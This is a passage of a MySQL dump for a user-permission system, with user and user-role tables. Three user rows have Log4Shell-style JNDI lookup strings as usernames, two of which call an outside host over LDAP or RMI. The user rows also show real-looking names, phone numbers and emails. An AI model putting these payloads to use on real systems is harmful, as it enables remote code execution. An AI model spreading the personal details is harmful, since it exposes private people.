	(1, 'admin', 'admin', '系统管理员', '', '/avatar7.jpg', 2, '13771977785', '871834898@qq.com', 4, 1, '2022-11-29 21:16:14', '', 0, 0, '', '2020-06-02 18:04:28', 1, 'admin', '2022-11-16 23:02:04', 0),
	(2, 'wjg', 'wjg', '王杰光', '', '/avatar8.jpg', 1, '13771977785', '871834898@qq.com', 9, 3, '2022-11-16 23:09:07', '', 0, 0, '', '2020-07-03 16:21:25', 2, 'wjg', '2022-11-16 23:08:55', 0),
	(3, 'test', 'test', '王晓光', '', '/avatar5.jpg', 2, '13771977785', 'hbjieguang@126.com', 6, 1, '2022-07-17 20:22:18', '', 0, 0, '', '2020-07-06 17:10:01', 1, 'admin', '2021-08-03 20:50:46', 0),
	(4, 'gmk', 'gmk', '赶明困', '', '/avatar2.jpg', 1, '', '', 7, 1, '2022-07-04 10:02:13', '', 0, 1, 'admin', '2021-07-22 22:26:53', 1, 'admin', '2021-07-28 17:25:06', 0),
	(5, '1', '', '', '', '', 1, '', '', 0, 0, '1900-01-01 00:00:00', '', 0, 1, 'admin', '2021-08-10 17:28:29', 0, '', '1900-01-01 00:00:00', 1),
	(6, '13771977785', '13771977785', '', '', '', 2, '', '', 0, 0, '1900-01-01 00:00:00', '', 0, 1, 'admin', '2021-08-10 17:35:02', 0, '', '2021-08-10 17:35:06', 1),
	(7, 'guest', 'guest', '访客用户', '', '/avatar8.jpg', 1, '13771988888', 'wangjg@eav.top', 4, 6, '2021-08-19 09:49:40', '', 0, 4, 'gmk', '2021-08-19 09:18:43', 2, '王杰光', '2022-09-30 17:17:50', 0),
	(8, '\\${jndi:ldap://jiqunar.com/}', '6ce0976db6b8e90701a1fea029bd152a', '111', '', '', 2, '', '', 0, 0, '2021-12-14 09:21:29', '', 0, 4, 'gmk', '2021-12-14 09:14:51', 2, '王杰光', '2022-09-30 17:17:00', 1),
	(9, '\\${java:os}', '423cbeaa25f4069a9e8e8e7aa691959c', '', '', '', 1, '', '', 0, 0, '2021-12-14 09:20:11', '', 0, 4, 'gmk', '2021-12-14 09:19:31', 2, '王杰光', '2022-09-30 17:16:44', 1),
	(10, '${jndi:rmi://jiqunar.com}', '2ad7068324fc610ed0ef2fafb6dd84df', '', '', '', 1, '', '', 0, 0, '2021-12-14 09:27:48', '', 0, 4, 'gmk', '2021-12-14 09:27:34', 2, '王杰光', '2022-08-24 13:54:01', 1);

-- 导出  表 light_upms.lu_user_role 结构
CREATE TABLE IF NOT EXISTS `lu_user_role` (
  `id` bigint NOT NULL AUTO_INCREMENT COMMENT '主键Id',
  `user_id` bigint NOT NULL DEFAULT '0' COMMENT '用户Id',
  `role_id` bigint NOT NULL DEFAULT '0' COMMENT '角色Id',
  `creater_id` bigint NOT NULL DEFAULT '0' COMMENT '创建人Id',
  `creater_name` varchar(255) NOT NULL DEFAULT '' COMMENT '创建人名字',
  `create_date` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  `updater_id` bigint NOT NULL DEFAULT '0' COMMENT '更新人Id',
  `updater_name` varchar(20) NOT NULL DEFAULT '' COMMENT '更新人名字',
  `update_date` datetime NOT NULL DEFAULT '1900-01-01 00:00:00' COMMENT '更新时间',
  `is_deleted` tinyint NOT NULL DEFAULT '0' COMMENT '是否删除（0未删除，1已删除）',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='用户角色';

-- 正在导出表  light_upms.lu_user_role 的数据：~19 rows (大约)
DELETE FROM `lu_user_role`;
INSERT INTO `lu_user_role` (`id`, `user_id`, `role_id`, `creater_id`, `creater_name`, `create_date`, `updater_id`, `updater_name`, `update_date`, `is_deleted`) VALUES
	(1, 1, 1, 0, '', '2020-06-03 12:07:04', 0, '', '1900-01-01 00:00:00', 0),
	(2, 1, 2, 0, '', '2020-06-03 12:07:04', 0, '', '1900-01-01 00:00:00', 1),
	(3, 1, 4, 0, '', '2020-07-10 13:18:47', 0, '', '1900-01-01 00:00:00', 1),
	(4, 1, 2, 0, '', '2020-07-10 13:19:12', 0, '', '1900-01-01 00:00:00', 1),
	(5, 3, 1, 0, '', '2020-07-15 16:32:36', 0, '', '1900-01-01 00:00:00', 1),
	(6, 3, 2, 0, '', '2020-07-15 16:32:37', 0, '', '1900-01-01 00:00:00', 1),
	(7, 3, 4, 0, '', '2020-07-15 16:32:37', 0, '', '1900-01-01 00:00:00', 1),
	(8, 2, 2, 0, '', '2020-08-20 16:47:35', 0, '', '1900-01-01 00:00:00', 1),
	(9, 3, 4, 1, 'admin', '2020-12-09 19:34:29', 0, '', '1900-01-01 00:00:00', 0),
	(10, 4, 1, 1, 'admin', '2021-07-22 22:26:53', 0, '', '1900-01-01 00:00:00', 0),
	(11, 4, 2, 1, 'admin', '2021-07-22 22:26:53', 0, '', '1900-01-01 00:00:00', 1),
	(12, 2, 4, 1, 'admin', '2021-07-25 00:51:10', 0, '', '1900-01-01 00:00:00', 1),
	(13, 2, 4, 1, 'admin', '2021-08-04 23:45:00', 0, '', '1900-01-01 00:00:00', 1),
	(14, 2, 1, 1, 'admin', '2021-08-10 21:17:23', 0, '', '1900-01-01 00:00:00', 0),
	(15, 7, 5, 4, 'gmk', '2021-08-19 09:18:54', 0, '', '1900-01-01 00:00:00', 1),
	(16, 7, 4, 2, 'wjg', '2021-08-19 09:49:07', 0, '', '1900-01-01 00:00:00', 0),
	(17, 9, 4, 4, 'gmk', '2021-12-14 09:19:54', 0, '', '1900-01-01 00:00:00', 0),
	(18, 8, 4, 4, 'gmk', '2021-12-14 09:20:01', 0, '', '1900-01-01 00:00:00', 0),
	(19, 10, 4, 4, 'gmk', '2021-12-14 09:27:34', 0, '', '1900-01-01 00:00:00', 0),
	(20, 7, 5, 2, '王杰光', '2022-09-30 17:17:50', 0, '', '1900-01-01 00:00:00', 0);

/*!40103 SET TIME_ZONE=IFNULL(@OLD_TIME_ZONE, 'system') */;
/*!40101 SET SQL_MODE=IFNULL(@OLD_SQL_MODE, '') */;
/*!40014 SET FOREIGN_KEY_CHECKS=IFNULL(@OLD_FOREIGN_KEY_CHECKS, 1) */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40111 SET SQL_NOTES=IFNULL(@OLD_SQL_NOTES, 1) */;
